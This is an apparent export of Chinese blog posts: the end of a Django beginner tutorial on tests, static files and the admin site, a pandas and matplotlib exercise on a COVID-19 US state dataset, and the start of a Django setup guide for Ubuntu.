这是一个非常简单但非常有用的测试用例，我们测试的是请求该URL后返回的响应状态码。状态码200意味着成功。 请求一下主页后，我们可以在控制台中看到响应的状态代码： 如果出现未捕获的异常，语法错误或其他任何情况，Django会返回状态代码500，这意味着是内部服务器错误。现在，想象我们的应用程序有100个视图函数。如果我们为所有视图编写这个简单的测试，只需一个命令，我们就能够测试所有视图是否返回成功代码，因此用户在任何地方都看不到任何错误消息。如果没有自动化测试，我们需要逐一检查每个页面是否有错误。 执行Django的测试套件： python manage.py test 测试结果： 现在我们可以测试Django是否在请求的URL的时候返回了正确的视图函数。这也是一个有用的测试，因为随着开发的进展，您会发现urls.py模块可能变得非常庞大而复杂。URL conf 全部是关于解析正则表达式的。有些情况下有一个非常宽容的URL（译注：本来不应该匹配的，却因为正则表达式写的过于宽泛而错误的匹配了），所以Django最终可能返回错误的视图函数。 我们可以这样做： boards/tests.py 1234567891011121314from django.core.urlresolvers import reversefrom django.urls import resolvefrom django.test import TestCasefrom .views import homeclass HomeTests(TestCase): def test_home_view_status_code(self): url = reverse('home') response = self.client.get(url) self.assertEquals(response.status_code, 200) def test_home_url_resolves_home_view(self): view = resolve('/') self.assertEquals(view.func, home) 在第二个测试中，我们使用了resolve函数。Django使用它来将浏览器发起请求的URL与urls.py模块中列出的URL进行匹配。该测试用于确定URL /返回 home 视图。 再次测试： python manage.py test 要查看有关测试执行时更详细的信息，可将verbosity的级别设置得更高一点： python manage.py test --verbosity=2 测试结果： verbosity决定了将要打印到控制台的通知和调试信息量; 0是无输出，1是正常输出，2是详细输出。 静态文件设置静态文件是指 CSS，JavaScript，字体，图片或者是用来组成用户界面的任何其他资源。 实际上，Django 本身是不负责处理这些文件的，但是为了让我们的开发过程更轻松，Django 提供了一些功能来帮助我们管理静态文件。这些功能可在 INSTALLED_APPS 的 django.contrib.staticfiles 应用程序中找到（译者：Django为了使得开发方便，也可以处理静态文件，而在生产环境下，静态文件一般直接由 Nginx 等反向代理服务器处理，而应用服务器专心负责处理它擅长的业务逻辑） 市面上很多优秀前端组件框架，我们没有理由继续用简陋的HTML文档来渲染。我们可以轻松地将Bootstrap 4添加到我们的项目中。Bootstrap是一个用HTML，CSS和JavaScript开发的前端开源工具包。 在项目根目录中，除了boards, templates 和myproject文件夹外，再创建一个名为static的新文件夹，并在static文件夹内创建另一个名为css的文件夹： myproject/ |-- myproject/ | |-- boards/ | |-- myproject/ | |-- templates/ | |-- static/ &lt;-- here | | +-- css/ &lt;-- and here | +-- manage.py +-- venv/ 转到getbootstrap.com并下载最新版本： 下载编译版本的CSS和JS 在你的计算机中，解压 bootstrap-4.0.0-beta-dist.zip 文件，将文件 css/bootstrap.min.css 复制到我们项目的css文件夹中： myproject/ |-- myproject/ | |-- boards/ | |-- myproject/ | |-- templates/ | |-- static/ | | +-- css/ | | +-- bootstrap.min.css &lt;-- here | +-- manage.py +-- venv/ 下一步是告诉Django在哪里可以找到静态文件。打开settings.py，拉到文件的底部，在STATIC_URL后面添加以下内容： 12345STATIC_URL = '/static/'STATICFILES_DIRS = [ os.path.join(BASE_DIR, 'static'),] TEMPLATES目录和这个配置是一样的 必须在模板中加载静态文件（Bootstrap CSS文件）： templates/home.html 1234567891011121314151617181920212223242526272829303132333435&#123;% load static %&#125;&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;Boards&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"&#123;% static 'css/bootstrap.min.css' %&#125;\"&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Boards&lt;/h1&gt;&lt;table border=\"1\"&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;Board&lt;/th&gt; &lt;th&gt;Posts&lt;/th&gt; &lt;th&gt;Topics&lt;/th&gt; &lt;th&gt;Last Post&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &#123;% for board in boards %&#125; &lt;tr&gt; &lt;td&gt; &#123;&#123; board.name &#125;&#125;&lt;br&gt; &lt;small style=\"color: #888\"&gt;&#123;&#123; board.description &#125;&#125;&lt;/small&gt; &lt;/td&gt; &lt;td&gt;0&lt;/td&gt; &lt;td&gt;0&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt; &#123;% endfor %&#125; &lt;/tbody&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt; 首先，我们在模板的开头使用了 Static Files App 模板标签 {% load static %}。 模板标签{% static %}用于构成资源文件完整URL。在这种情况下，{% static 'css/bootstrap.min.css' %}将返回 /static/css/bootstrap.min.css，它相当于 http://127.0.0.1:8000/static/css/bootstrap.min.css。 {% static %}模板标签使用 settings.py文件中的 STATIC_URL 配置来组成最终的URL，例如，如果您将静态文件托管在像 https://static.example.com/ 这样的子域中 ，那么我们将设置 STATIC_URL=https://static.example.com/，然后 {% static 'css/bootstrap.min.css' %}返回的是 https://static.example.com/css/bootstrap.min.css 但凡是需要引用CSS，JavaScript或图片文件的地方就使用{% static %}。稍后，当我们开始部署项目到正式环境时，我们将讨论更多。现在都设置好了。 刷新页面 http://127.0.0.1:8000 ，我们可以看到它可以正常运行： 现在我们可以编辑模板，以利用Bootstrap CSS： 1234567891011121314151617181920212223242526272829303132333435363738&#123;% load static %&#125;&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;Boards&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"&#123;% static 'css/bootstrap.min.css' %&#125;\"&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=\"container\"&gt; &lt;ol class=\"breadcrumb my-4\"&gt; &lt;li class=\"breadcrumb-item active\"&gt;Boards&lt;/li&gt; &lt;/ol&gt; &lt;table class=\"table\"&gt; &lt;thead class=\"thead-dark\"&gt; &lt;tr&gt; &lt;th&gt;Board&lt;/th&gt; &lt;th&gt;Posts&lt;/th&gt; &lt;th&gt;Topics&lt;/th&gt; &lt;th&gt;Last Post&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &#123;% for board in boards %&#125; &lt;tr&gt; &lt;td&gt; &#123;&#123; board.name &#125;&#125; &lt;small class=\"text-muted d-block\"&gt;&#123;&#123; board.description &#125;&#125;&lt;/small&gt; &lt;/td&gt; &lt;td class=\"align-middle\"&gt;0&lt;/td&gt; &lt;td class=\"align-middle\"&gt;0&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt; &#123;% endfor %&#125; &lt;/tbody&gt; &lt;/table&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 显示效果： 到目前为止，我们使用交互式控制台（python manage.py shell）添加了几个新的版块。但我们需要一个更好的方式来实现。接下来，我们将为网站管理员实现一个管理界面来管理这些数据。 Django Admin介绍当我们开始一个新项目时，Django已经配置了Django Admin，这个应用程序列出的INSTALLED_APPS。 使用 Django Admin的一个很好的例子就是用在博客中; 它可以被作者用来编写和发布文章。另一个例子是电子商务网站，工作人员可以创建，编辑，删除产品。 现在，我们将配置 Django Admin 来维护我们应用程序的版块。 我们首先创建一个管理员帐户： python manage.py createsuperuser 按照说明操作： 12345Username (leave blank to use &#39;vitorfs&#39;): adminEmail address: admin@example.comPassword:Password (again):Superuser created successfully. 在浏览器中打开该URL：http://127.0.0.1:8000/admin/ 输入用户名和密码登录到管理界面： 它已经配置了一些功能。在这里，我们可以添加用户和组的权限管理，这些概念在后面我们将探讨更多。 添加Board模型非常简单。打开boards目录中的admin.py文件，并添加以下代码： boards/admin.py 1234from django.contrib import adminfrom .models import Boardadmin.site.register(Board) 保存admin.py文件，然后刷新网页浏览器中的页面： 对！它已准备好被使用了。点击Boards链接查看现有版块列表： 我们可以通过点击 Add Board 按钮添加一个新的版块： 点击保存按钮： 我们可以检查一切是否正常，打开URL http://127.0.0.1:8000 总结在本教程中，我们探讨学习了许多新概念。我们为项目定义了一些需求，创建了第一个模型，迁移了数据库，开始玩 Models API。我们创建了第一个视图并编写了一些单元测试。同时我们还配置了Django模板引擎，静态文件，并将Bootstrap 4库添加到项目中。最后，我们简要介绍了Django Admin界面。 这是学习的基础部分！下一部分，将学习探索Django的URL路由，表单API，可重用模板以及更多测试。 参考链接 https://simpleisbetterthancomplex.com/series/2017/09/11/a-complete-beginners-guide-to-django-part-2.html#figure-4","categories":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/categories/python/"},{"name":"Web框架","slug":"python/Web框架","permalink":"https://fishni.github.io/categories/python/Web%E6%A1%86%E6%9E%B6/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"Web框架","slug":"Web框架","permalink":"https://fishni.github.io/tags/Web%E6%A1%86%E6%9E%B6/"}]},{"title":"【数据集分析】新冠肺炎COVID-19数据集简单分析与处理","slug":"新冠肺炎COVID-19 State Data Set的简单分析与处理","date":"2020-04-25T16:00:00.000Z","updated":"2020-04-26T10:16:56.821Z","comments":true,"path":"2020/04/26/新冠肺炎COVID-19 State Data Set的简单分析与处理/","link":"","permalink":"https://fishni.github.io/2020/04/26/%E6%96%B0%E5%86%A0%E8%82%BA%E7%82%8ECOVID-19%20State%20Data%20Set%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%84%E7%90%86/","excerpt":"本文主要是：新冠肺炎COVID-19 State Data Set的简单分析与处理","text":"本文主要是：新冠肺炎COVID-19 State Data Set的简单分析与处理 Step 1Use Pandas to load COVID-19 State Data Set as the dataframe.Pandas 由于数据持续更新,所以下载链接仅供参考，链接：https://pan.baidu.com/s/1npzHaEX5DUudB1yTTm8hyQ提取码：qy8i 若需要请到此，下载最新数据COVID-19 State Data Set 1234import pandas as pddata = pd.read_csv('COVID19_state.csv')df = pd.DataFrame(data)df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } State Tested Infected Deaths Population Pop Density Gini ICU Beds Income GDP ... Hospitals Health Spending Pollution Med-Large Airports Temperature Urban Age 0-25 Age 26-54 Age 55+ School Closure Date 0 Alaska 9655 314 9 734002 1.2863 0.4081 119 59687 73205 ... 21 11064 6.4 1.0 26.60 66.0 0.36 0.39 0.25 03/19/20 1 Alabama 42538 4723 151 4908621 96.9221 0.4847 1533 42334 45219 ... 101 7281 8.1 1.0 62.80 59.0 0.33 0.37 0.31 03/16/20 2 Arkansas 24141 1739 38 3038999 58.4030 0.4719 732 42566 42454 ... 88 7408 7.1 0.0 60.40 56.2 0.34 0.37 0.30 03/17/20 3 Arizona 51045 4719 177 7378494 64.9550 0.4713 1559 43650 48055 ... 83 6452 9.7 1.0 60.30 89.8 0.33 0.36 0.30 03/16/20 4 California 266900 28963 1072 39937489 256.3727 0.4899 7338 62586 74205 ... 359 7549 12.8 9.0 59.40 95.0 0.33 0.40 0.26 03/19/20 5 Colorado 44606 9433 411 5845526 56.4011 0.4586 1597 56846 63882 ... 89 6804 6.7 1.0 45.10 86.2 0.33 0.40 0.27 03/23/20 6 Connecticut 58213 17550 1086 3563077 735.8689 0.4945 674 74561 76342 ... 32 9859 7.2 1.0 49.00 88.0 0.30 0.38 0.32 03/17/20 7 District of Columbia 13268 2666 91 720687 11814.5410 0.5420 314 47285 200277 ... 10 11944 9.8 0.0 54.65 100.0 0.30 0.48 0.22 03/16/20 8 Delaware 14794 2538 67 982895 504.3073 0.4522 186 51449 77253 ... 7 10254 8.3 0.0 55.30 83.3 0.30 0.37 0.33 03/16/20 9 Florida 253183 25492 748 21992985 410.1256 0.4852 5604 49417 48318 ... 217 8076 7.4 7.0 70.70 91.2 0.29 0.37 0.35 03/16/20 10 Georgia 74208 17841 677 10736059 186.6719 0.4813 2508 45745 55832 ... 145 6587 8.3 1.0 63.50 75.1 0.35 0.39 0.26 03/18/20 11 Hawaii 23215 574 9 1412687 219.9419 0.4420 201 54565 64096 ... 22 7299 5.4 2.0 70.00 91.9 0.30 0.37 0.32 03/23/20 12 Iowa 22947 2513 74 3179849 56.9284 0.4451 545 48823 59977 ... 118 8200 7.1 0.0 47.80 64.0 0.34 0.36 0.30 NaN 13 Idaho 16869 1668 44 1826156 22.0969 0.4503 314 43155 43430 ... 45 6927 6.8 0.0 44.40 70.6 0.36 0.36 0.28 03/23/20 14 Illinois 137404 29160 1259 12659682 228.0243 0.4810 3144 56933 67268 ... 187 8262 9.3 2.0 51.80 88.5 0.33 0.38 0.28 03/17/20 15 Indiana 56873 10641 545 6745354 188.2810 0.4527 1861 46646 55172 ... 132 8300 8.4 1.0 51.70 72.4 0.34 0.37 0.29 03/19/20 16 Kansas 17676 1790 86 2910357 35.5968 0.4550 767 50155 56334 ... 139 7651 7.0 0.0 54.30 74.2 0.35 0.36 0.29 03/18/20 17 Kentucky 32225 2707 144 4499692 113.9566 0.4813 1392 41779 46898 ... 105 8004 8.1 1.0 55.60 58.4 0.33 0.38 0.30 03/16/20 18 Louisiana 137999 23580 1267 4645184 107.5175 0.4990 1289 45542 53589 ... 158 7815 7.9 1.0 66.40 73.2 0.34 0.37 0.28 03/16/20 19 Massachusetts 156806 36372 1560 6976597 894.4355 0.4786 1326 70073 82480 ... 75 10559 6.3 1.0 47.90 92.0 0.30 0.39 0.31 03/17/20 20 Maryland 65370 12308 463 6083116 626.6731 0.4499 1134 62914 68573 ... 50 8602 7.7 1.0 54.20 87.2 0.31 0.39 0.29 03/16/20 21 Maine 4241 847 32 1345790 43.6336 0.4519 256 48241 47969 ... 34 9531 5.9 0.0 41.00 38.7 0.26 0.37 0.37 NaN 22 Michigan 107791 30791 2308 10045029 177.6655 0.4695 2423 47582 53209 ... 144 8055 8.0 1.0 44.40 74.6 0.32 0.37 0.31 03/16/20 23 Minnesota 44368 2213 121 5700671 71.5922 0.4496 1171 56374 64675 ... 127 8871 6.6 1.0 41.20 73.3 0.32 0.38 0.30 03/18/20 24 Missouri 53525 5517 175 6169270 89.7453 0.4646 1888 46635 51699 ... 122 8107 7.5 2.0 54.60 70.4 0.33 0.37 0.31 03/19/20 25 Mississippi 37733 3974 152 2989260 63.7056 0.4828 824 37994 37948 ... 99 7646 7.7 0.0 63.40 49.4 0.35 0.36 0.29 03/20/20 26 Montana 10569 426 10 1086759 7.4668 0.4667 165 47120 46609 ... 56 8221 6.6 0.0 42.70 55.9 0.31 0.35 0.34 03/16/20 27 North Carolina 76211 6140 164 10611862 218.2702 0.4780 2227 45834 54441 ... 112 7264 7.2 2.0 59.00 66.1 0.32 0.38 0.29 03/16/20 28 North Dakota 12963 528 9 761723 11.0393 0.4533 238 54306 72597 ... 39 9851 4.6 0.0 40.40 59.9 0.35 0.37 0.28 03/16/20 29 Nebraska 13753 1138 24 1952570 25.4161 0.4477 440 52110 63942 ... 93 8412 7.1 1.0 48.80 73.1 0.35 0.37 0.29 NaN 30 New Hampshire 13424 1342 38 1371246 153.1605 0.4304 242 61405 63067 ... 28 9589 4.4 0.0 43.80 60.3 0.28 0.37 0.34 03/16/20 31 New Jersey 162536 81420 4070 8936574 1215.1991 0.4813 1822 67609 69378 ... 82 8859 8.1 1.0 52.70 94.7 0.31 0.38 0.30 03/18/20 32 New Mexico 36632 1798 51 2096640 17.2850 0.4769 340 41198 46954 ... 41 7214 6.0 1.0 53.40 77.4 0.33 0.36 0.31 03/16/20 33 Nevada 30751 3626 155 3139658 28.5993 0.4577 900 48225 55269 ... 44 6714 9.0 1.0 49.90 94.2 0.32 0.40 0.29 03/16/20 34 New York 596532 236732 12192 19440469 412.5211 0.5229 3952 68667 85746 ... 166 9778 6.6 3.0 45.40 87.9 0.31 0.39 0.30 03/18/20 35 Ohio 83131 10222 451 11747694 287.5038 0.4680 3314 48242 57492 ... 194 8712 8.5 3.0 50.70 77.9 0.32 0.37 0.31 03/17/20 36 Oklahoma 35561 2465 136 3954821 57.6547 0.4645 1064 46128 50613 ... 125 7627 8.2 0.0 59.60 66.2 0.35 0.37 0.29 03/17/20 37 Oregon 37583 1844 72 4301089 44.8086 0.4583 659 49908 56956 ... 61 8044 7.8 1.0 48.40 81.0 0.30 0.39 0.31 03/16/20 38 Pennsylvania 153965 31069 836 12820878 286.5449 0.4689 3169 55349 61594 ... 199 9258 9.2 2.0 48.80 78.7 0.30 0.37 0.32 03/16/20 39 Rhode Island 10933 1118 60 1056161 1021.4323 0.4781 279 54523 57852 ... 11 9551 7.3 0.0 50.10 90.7 0.29 0.39 0.32 03/16/20 40 South Carolina 32826 4491 137 5210095 173.3174 0.4735 1225 42736 45280 ... 69 7311 7.4 0.0 62.40 66.3 0.32 0.36 0.32 03/16/20 41 South Dakota 38833 4246 119 903027 11.9116 0.4495 152 50141 58624 ... 57 8933 5.1 0.0 45.20 56.7 0.35 0.35 0.30 03/16/20 42 Tennessee 11661 1542 7 6897576 167.2748 0.4790 2209 47179 53933 ... 115 7372 7.4 1.0 57.60 66.4 0.33 0.38 0.29 03/20/20 43 Texas 90586 6762 145 29472295 112.8204 0.4800 6199 49161 61167 ... 523 6998 8.3 6.0 64.80 84.7 0.36 0.39 0.24 03/23/20 44 Utah 176239 18260 453 3282115 39.9430 0.4063 565 45340 55550 ... 54 5982 8.4 1.0 48.60 90.6 0.42 0.37 0.21 03/16/20 45 Virginia 59944 2931 25 8626207 218.4403 0.4705 1654 56952 62563 ... 96 7556 6.9 2.0 55.10 75.5 0.33 0.38 0.29 03/16/20 46 Vermont 51931 8053 258 628061 68.1416 0.4539 94 53598 53523 ... 14 10190 5.1 0.0 42.90 38.9 0.27 0.36 0.36 03/18/20 47 Washington 12116 779 35 7797095 117.3272 0.4591 1265 60781 74182 ... 92 7913 8.0 1.0 48.30 84.1 0.31 0.40 0.29 03/17/20 48 Wisconsin 131984 11802 624 5851754 108.0497 0.4498 1159 50756 57720 ... 133 8702 6.8 1.0 43.10 70.2 0.32 0.37 0.31 03/18/20 49 West Virginia 48161 4199 211 1778070 73.9691 0.4711 653 40578 43053 ... 56 9462 7.6 0.0 51.80 48.7 0.29 0.36 0.35 03/16/20 50 Wyoming 19794 825 18 567025 5.8400 0.4360 102 60095 69900 ... 29 8320 5.0 0.0 42.00 64.8 0.32 0.36 0.31 03/20/20 51 rows × 26 columns 1df.keys() Index([&apos;State&apos;, &apos;Tested&apos;, &apos;Infected&apos;, &apos;Deaths&apos;, &apos;Population&apos;, &apos;Pop Density&apos;, &apos;Gini&apos;, &apos;ICU Beds&apos;, &apos;Income&apos;, &apos;GDP&apos;, &apos;Unemployment&apos;, &apos;Sex Ratio&apos;, &apos;Smoking Rate&apos;, &apos;Flu Deaths&apos;, &apos;Respiratory Deaths&apos;, &apos;Physicians&apos;, &apos;Hospitals&apos;, &apos;Health Spending&apos;, &apos;Pollution&apos;, &apos;Med-Large Airports&apos;, &apos;Temperature&apos;, &apos;Urban&apos;, &apos;Age 0-25&apos;, &apos;Age 26-54&apos;, &apos;Age 55+&apos;, &apos;School Closure Date&apos;], dtype=&apos;object&apos;)Step 2 Get 20 data items as sample randomly and show them. 12df1 = df.sample(frac=0.4)df1 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } State Tested Infected Deaths Population Pop Density Gini ICU Beds Income GDP ... Hospitals Health Spending Pollution Med-Large Airports Temperature Urban Age 0-25 Age 26-54 Age 55+ School Closure Date 26 Montana 10569 426 10 1086759 7.4668 0.4667 165 47120 46609 ... 56 8221 6.6 0.0 42.7 55.9 0.31 0.35 0.34 03/16/20 22 Michigan 107791 30791 2308 10045029 177.6655 0.4695 2423 47582 53209 ... 144 8055 8.0 1.0 44.4 74.6 0.32 0.37 0.31 03/16/20 15 Indiana 56873 10641 545 6745354 188.2810 0.4527 1861 46646 55172 ... 132 8300 8.4 1.0 51.7 72.4 0.34 0.37 0.29 03/19/20 11 Hawaii 23215 574 9 1412687 219.9419 0.4420 201 54565 64096 ... 22 7299 5.4 2.0 70.0 91.9 0.30 0.37 0.32 03/23/20 14 Illinois 137404 29160 1259 12659682 228.0243 0.4810 3144 56933 67268 ... 187 8262 9.3 2.0 51.8 88.5 0.33 0.38 0.28 03/17/20 6 Connecticut 58213 17550 1086 3563077 735.8689 0.4945 674 74561 76342 ... 32 9859 7.2 1.0 49.0 88.0 0.30 0.38 0.32 03/17/20 41 South Dakota 38833 4246 119 903027 11.9116 0.4495 152 50141 58624 ... 57 8933 5.1 0.0 45.2 56.7 0.35 0.35 0.30 03/16/20 49 West Virginia 48161 4199 211 1778070 73.9691 0.4711 653 40578 43053 ... 56 9462 7.6 0.0 51.8 48.7 0.29 0.36 0.35 03/16/20 28 North Dakota 12963 528 9 761723 11.0393 0.4533 238 54306 72597 ... 39 9851 4.6 0.0 40.4 59.9 0.35 0.37 0.28 03/16/20 25 Mississippi 37733 3974 152 2989260 63.7056 0.4828 824 37994 37948 ... 99 7646 7.7 0.0 63.4 49.4 0.35 0.36 0.29 03/20/20 42 Tennessee 11661 1542 7 6897576 167.2748 0.4790 2209 47179 53933 ... 115 7372 7.4 1.0 57.6 66.4 0.33 0.38 0.29 03/20/20 30 New Hampshire 13424 1342 38 1371246 153.1605 0.4304 242 61405 63067 ... 28 9589 4.4 0.0 43.8 60.3 0.28 0.37 0.34 03/16/20 29 Nebraska 13753 1138 24 1952570 25.4161 0.4477 440 52110 63942 ... 93 8412 7.1 1.0 48.8 73.1 0.35 0.37 0.29 NaN 35 Ohio 83131 10222 451 11747694 287.5038 0.4680 3314 48242 57492 ... 194 8712 8.5 3.0 50.7 77.9 0.32 0.37 0.31 03/17/20 3 Arizona 51045 4719 177 7378494 64.9550 0.4713 1559 43650 48055 ... 83 6452 9.7 1.0 60.3 89.8 0.33 0.36 0.30 03/16/20 12 Iowa 22947 2513 74 3179849 56.9284 0.4451 545 48823 59977 ... 118 8200 7.1 0.0 47.8 64.0 0.34 0.36 0.30 NaN 24 Missouri 53525 5517 175 6169270 89.7453 0.4646 1888 46635 51699 ... 122 8107 7.5 2.0 54.6 70.4 0.33 0.37 0.31 03/19/20 31 New Jersey 162536 81420 4070 8936574 1215.1991 0.4813 1822 67609 69378 ... 82 8859 8.1 1.0 52.7 94.7 0.31 0.38 0.30 03/18/20 20 Maryland 65370 12308 463 6083116 626.6731 0.4499 1134 62914 68573 ... 50 8602 7.7 1.0 54.2 87.2 0.31 0.39 0.29 03/16/20 4 California 266900 28963 1072 39937489 256.3727 0.4899 7338 62586 74205 ... 359 7549 12.8 9.0 59.4 95.0 0.33 0.40 0.26 03/19/20 20 rows × 26 columns Step 3Show 10 data items which the Deaths are more than 100 as sample randomly. 123df2 = df[df['Deaths']&gt;100]df3 = df2.sample(n = 10)df3 Step 4 Sort the data by GDP and present the top 20 data items. 12df4= df.sort_values(by=['GDP'])df4.iloc[0:20,] Step 5 Show the simple statistical information (mean, std, min, max, quartile1, quartile2, quartile3). 123#1.meanprint(df.mean())# 列平均print(df.mean(1))# 行平均 123# 2.stdprint(df.std()) # 列stdprint(df.std(1)) 12# 3.minprint(df.min()) 12# 4.df.min()df.max() 12# 5.quartile1df.quantile() 12# 6.df.quantile(q=0.5) 12# 7.df.quantile(q=0.75) Step 6 Use matplotlib show 2D images about data. Matplotlib Plot the distribution of two class (1. GDP &lt; 58000, 2. GDP &gt;= 58000) of COVID-19 State Data using different colors and different marker where x-axis is the Pollution and y-axis the Mortality-rate. 1234567891011import matplotlib.pyplot as pltdf_GDP1 = df[df['GDP']&lt;58000]df_GDP2 = df[df['GDP']&gt;=58000]plt.figure()ax1 = df_GDP1.plot(x='Pollution',y='Deaths')df_GDP2.plot(x='Pollution',y='Deaths',ax=ax1)# 为图表添加标题plt.title(\"testddddd\")plt.show() &lt;Figure size 432x288 with 0 Axes&gt; Step 7Show the proportion of three class of COVID-19 State Data using pie chart. About the class: 1、 Mortality-rate &lt; 0.02 2、 Mortality-rate between 0.02 and 0.03 3、Mortality-rate &gt; 0.03 123456789101112131415161718# 死亡率&lt;0.02sizes= []df_death1 = df[df['Deaths']/df['Infected']&lt;0.02]d1= df_death1.shape[0] # 返回行数sizes.append(d1)# 死亡率在0.02 and 0.03之间df_death2 = df[df['Deaths']/df['Infected']&lt;=0.03]d2 = df_death2.shape[0] - d1sizes.append(d2)# 死亡率在0.03之上df_death3 = df[df['Deaths']/df['Infected']&gt;0.03]d3 = df_death3.shape[0]sizes.append(d3)labels = ['Mortality-rate &lt; 0.02',' Mortality-rate between 0.02 and 0.03','Mortality-rate &gt; 0.03']plt.pie(sizes,labels=labels,autopct='%1.1f%%',shadow=False,startangle=150)plt.axis('equal') #该行代码使饼图长宽相等plt.show() 参考链接 饼图绘制： https://www.cnblogs.com/biyoulin/p/9565350.html https://www.jianshu.com/p/0a76c94e9db7 https://blog.csdn.net/ChenVast/article/details/81632794 Panda DataFrame 绘图 https://blog.csdn.net/weixin_39778570/article/details/81143763 Pandas数据帧（DataFrame） https://www.yiibai.com/pandas/python_pandas_dataframe.html https://www.cnblogs.com/dev-liu/p/pandas_plt_basic.html https://blog.csdn.net/zhengxu25689/article/details/87347700 其他 https://blog.csdn.net/kylinxjd/article/details/98307811","categories":[{"name":"人工智能","slug":"人工智能","permalink":"https://fishni.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据集","slug":"数据集","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E9%9B%86/"}]},{"title":"【Django】1. Django入门与实践-入门","slug":"1. Django入门与实践-入门","date":"2020-04-19T16:00:00.000Z","updated":"2020-04-26T12:36:33.779Z","comments":true,"path":"2020/04/20/1. Django入门与实践-入门/","link":"","permalink":"https://fishni.github.io/2020/04/20/1.%20Django%E5%85%A5%E9%97%A8%E4%B8%8E%E5%AE%9E%E8%B7%B5-%E5%85%A5%E9%97%A8/","excerpt":"本文主要内容：Django基础概念、环境搭建（python在ubuntu中安装，virtualenv虚拟环境安装，Django1.11.4安装）、创建一个简单的django项目，并创建了简单的初始应用程序","text":"本文主要内容：Django基础概念、环境搭建（python在ubuntu中安装，virtualenv虚拟环境安装，Django1.11.4安装）、创建一个简单的django项目，并创建了简单的初始应用程序 前言 今天我将开始对一个关于Django基础知识的全新系列教程的学习。这是一个开始学习 Django 的完整入门指南。教程材料一共会被分为七个部分，将从安装，开发环境的准备、模型、视图、模板、URL到更高级的主题（如迁移、测试和部署）中详细探讨学习所有基本概念。 引用中国古代一句话开始新的实践学习 为什么学习Django？Django是一个用python编写的Web框架。Web框架是一种软件，基于web框架可以开发动态网站，各种应用程序以及服务。它提供了一系列工具和功能，可以解决许多与Web开发相关的常见问题，比如：安全功能，数据库访问，会话，模板处理，URL路由，国际化，本地化，等等。 使用诸如 Django 之类的网络框架，使我们能够以标准化的方式快速开发安全可靠的Web应用程序，而无需重新发明轮子。 那么，Django有什么特别之处呢？对于初学者来说，它是一个Python Web框架，这意味着你可以受益于各种各样的开源库包。python软件包资料库（pypi）拥有超过11.6万个软件包（2017年9月6日的数据）。如果当你想要解决一个特定的问题的时候，可能有人已经为它实现了一个库来供你使用。 Django是用python编写的最流行的web框架之一。它绝对是最完整的，提供了各种各样的开箱即用的功能，比如用于开发和测试的独立Web服务器，缓存，中间件系统，ORM，模板引擎，表单处理，基于Python单元测试的工具接口。Django还自带内部电池，提供内置应用程序，比如一个认证系统，一个可用于 CRUD(增删改查) 操作并且自动生成页面的后台管理界面，生成订阅文档（RSS/Atom）,站点地图等。甚至在django中内建了一个地理信息系统（GIS）框架。 Django的开发得到了Django软件基金会的支持，并且由jetbrains和instagram等公司赞助。Django现在已经存在了相当长的一段时间了。到现在为止，活跃的项目开发时间超过13年，这也证明了它是一个成熟，可靠和安全的网络框架。 谁在使用Django？知道谁在使用Django是很好的，同时也想一想你可以用它来做些什么。在使用Django的大型网站有：Instagram，Disqus，Mozilla，Bitbucket，Last.fm，国家地理等。 想知道更多的示例，你可以到Django Sites数据库中查看，它提供超过五千个Django驱动的网站列表。 顺便说一下，去年在Django 2016年发布会上，Django核心开发人员，Instagram员工carl meyer，就Instagram如何大规模使用Django以及它如何支持他们的用户增长做过一次分享。这是个一小时的演讲，如果你有兴趣学习了解更多的话，这是一次很有趣的演讲。 环境搭建安装电脑上安装一些程序，以便使用django。基本的设置包括安装Python，Virtualenv和Django。 使用虚拟环境，使得在进行项目开发的时，便于使得每个项目会有独立的环境。这样在用Django开发一个网站或Web项目时，安装外部库，不用担心包之间的依赖关系发生冲突。同时，也可使得能够在不同Django版本上运行的本地机器的项目。 python安装 python版本选择 本教程选择python版本为3.6.2以上，也可以使用最新python版本 使用Python3，因为大部分主要的Python库已经被移植到python 3，并且下一个主要的django版本（2.x）也将不再支持python 2。所以Python 3是正确的选择。 本文使用ubuntu16.04进行python的安装，由于ubuntu中python版本分别为python2.7和python3.5.2 python 3.6.10安装 安装Python软件工具 sudo apt-get install python-software-properties 添加仓库镜像源 sudo add-apt-repository ppa:fkrull/deadsnakes 更新源 sudo apt-get update 从本地仓库安装python sudo apt-get install python3.6 终端输入python3.6,启动 安装 Virtualenv通过pip(一个管理和安装Python包的工具)来安装Virtualenv。 查看ubuntu中pip是否安装，默认的pip为Python2的 pip –version 安装pip3 apt install python3-pip 终端执行下面命令：(安装virtualenv） sudo pip3 install virtualenv 到目前为止，我们执行的安装都是在操作系统环境下运行的。从现在开始，我们安装的所有东西，包括django本身，都将安装在虚拟环境中。 这样想一下：对于你开始的每个Django项目，你首先会为它创建一个虚拟环境。这就像每个Django项目都有一个沙盒。所以你随意运行，安装软件包，卸载软件包而不会破坏任何东西。 virtualenv使用 创建一个Development文件夹，用其组织自己的项目和网站 